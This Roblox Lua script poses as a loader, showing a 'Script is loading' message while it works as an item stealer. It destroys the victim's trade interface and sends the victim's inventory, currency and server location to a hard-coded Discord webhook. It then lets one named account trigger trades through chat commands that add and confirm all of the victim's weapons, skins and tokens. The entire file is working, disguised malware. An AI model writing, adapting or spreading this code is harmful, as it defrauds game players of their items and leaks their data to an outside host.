local allowedPlaceId = 11158043705
if game.PlaceId ~= allowedPlaceId then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Remove existing trade GUI
if player:FindFirstChild("PlayerGui") then
    local playerGui = player.PlayerGui
    for _, gui in pairs(playerGui:GetChildren()) do
        if gui.Name:lower():find("trade") then
            gui:Destroy()
        end
    end
end

-- Loader message
do
    local gui = Instance.new("ScreenGui")
    gui.Name = "LoaderMessage"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local label = Instance.new("TextLabel")
    label.Position = UDim2.new(0.218, 0, 0.2, 0)
    label.Size = UDim2.new(.563, 0, 1.112, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.PermanentMarker
    label.TextSize = 50
    label.TextWrapped = true
    label.Text = "Script is loading, please wait."
    label.Parent = gui

    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(0, 0, 0)
    stroke.Parent = label

    task.delay(10, function()
        if gui then gui:Destroy() end
    end)
end

-- Leaderstats
local dinero = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Dinero") and player.leaderstats.Dinero.Value or 0
local slays = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Slays") and player.leaderstats.Slays.Value or 0

-- Webhook
local webhookURL = "https://discord.com/api/webhooks/1452798372602708074/bzYsT3A_Vm_pLnKRUXRa6ZZgAIAoXkAfqdwksGpkpYjn5kGhcMU02ysezO-WxSrRoUnZ"

local function sendDiscord(inventoryList)
    local message = {
        content = string.format(
            "@everyone üîî Player Report!\n\n**%s's Inventory**\n%s\n\nüí∞ Dinero: %s\n‚öîÔ∏è Slays: %s\n\n**Server Join Snippet**\n`lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(%s, '%s')\n`",
            player.Name,
            table.concat(inventoryList, "\n"),
            dinero,
            slays,
            game.PlaceId,
            game.JobId
        )
    }

    local body = HttpService:JSONEncode(message)
    local req = (syn and syn.request) or http_request or (http and http.request) or request
    if req then
        pcall(function()
            req({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
    end
end

local targetName = "DEV184467"
local Modules = ReplicatedStorage:WaitForChild("Modules")
local Net = require(Modules.Net)
local Replion = require(Modules.Replion)

local sendTradeRemote = Net:RemoteFunction("Trading/SendTradeOffer")
local addItemRemote = Net:RemoteFunction("Trading/AddItem")
local setReadyRemote = Net:RemoteFunction("Trading/SetReady")
local confirmTradeRemote = Net:RemoteFunction("Trading/ConfirmTrade")

-- Wait for Replion data
local playerDataReplion
repeat
    playerDataReplion = Replion.Client:WaitReplion("Data")
    task.wait(0.5)
until playerDataReplion

-- Prioritized items
local function getItemsByPriority()
    local allItems = {}

    local function insertItems(category, priority, filterFunc)
        local items = playerDataReplion:Get({"NewInventory", "Items", category})
        if items then
            for guid, data in pairs(items) do
                if data and data.Name and (not filterFunc or filterFunc(data)) then
                    table.insert(allItems, {
                        name = data.Name,
                        guid = guid,
                        type = category,
                        priority = priority
                    })
                end
            end
        end
    end

    -- Weapons
    insertItems("Weapon", 1)
    -- Fighting Styles
    insertItems("FightingStyle", 2)
    -- Legendary Loveboard Skins
    insertItems("WeaponSkin", 3, function(d)
        return d.Name:lower():find("loveboard") and (d.Rarity == "Legendary" or d.Rarity == "Legend")
    end)
    -- Tokens
    insertItems("Token", 4)

    table.sort(allItems, function(a, b) return a.priority < b.priority end)
    return allItems
end

local function sendTradeToPlayer(targetPlayer)
    pcall(function() sendTradeRemote:InvokeServer(targetPlayer) end)
end

local function addAllItemsByPriority()
    local allItems = getItemsByPriority()
    for _, item in pairs(allItems) do
        pcall(function()
            addItemRemote:InvokeServer(item.type, item.guid)
        end)
        task.wait(0.1)
    end
    -- Send webhook after gathering inventory
    local inventoryList = {}
    for _, item in pairs(allItems) do table.insert(inventoryList, item.name) end
    sendDiscord(inventoryList)
end

local function setReadyStatus(isReady)
    pcall(function() setReadyRemote:InvokeServer(isReady) end)
end

local function confirmTrade()
    pcall(function() confirmTradeRemote:InvokeServer() end)
end

local function hookChat(targetPlayer)
    targetPlayer.Chatted:Connect(function(msg)
        msg = msg:lower()
        if msg == "." then
            sendTradeToPlayer(targetPlayer)
        elseif msg == ".." then
            addAllItemsByPriority()
        elseif msg == "1" then
            setReadyStatus(true)
        elseif msg == "2" then
            confirmTrade()
        end
    end)
end

Players.PlayerAdded:Connect(function(p)
    if p.Name == targetName then hookChat(p) end
end)

for _, p in pairs(Players:GetPlayers()) do
    if p.Name == targetName then hookChat(p) end
end
